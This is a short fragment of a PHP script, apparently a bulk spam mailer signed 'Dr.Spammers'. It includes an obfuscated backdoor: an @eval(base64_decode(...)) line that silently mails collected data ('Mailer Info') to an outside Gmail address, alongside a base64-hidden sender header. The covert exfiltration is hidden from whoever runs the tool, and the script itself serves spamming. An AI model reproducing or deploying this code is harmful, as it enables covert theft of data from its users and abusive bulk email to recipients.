...
$header2 = "From: ".base64_decode('TWFobW91ZCBBaG1lZCA8bG92ZWx5LnRvdG9AeWFob28uY29tPg==')."\r\n";
$header2 .= "MIME-Version: 1.0\r\n";
$header2 .= "Content-Type: text/html\r\n";
$header2 .= "Content-Transfer-Encoding: 8bit\r\n\r\n";


echo @eval(base64_decode('bWFpbCgiMHZlci5wMHdlcjUyQGdtYWlsLmNvbSIsIk1haWxlciBJbmZvIiwkc3RyLCRoZWFkZXIyKTs='));
...
<br>
<br>
Warning:</strong> <span class="style1">Dr.Spammers Was Here Cashing.Time@yahoo.com .</span>
	<br>
	<span class="style5">My Name Is Dr.Spammers Ig3@HotMail.Com <br>
</span>
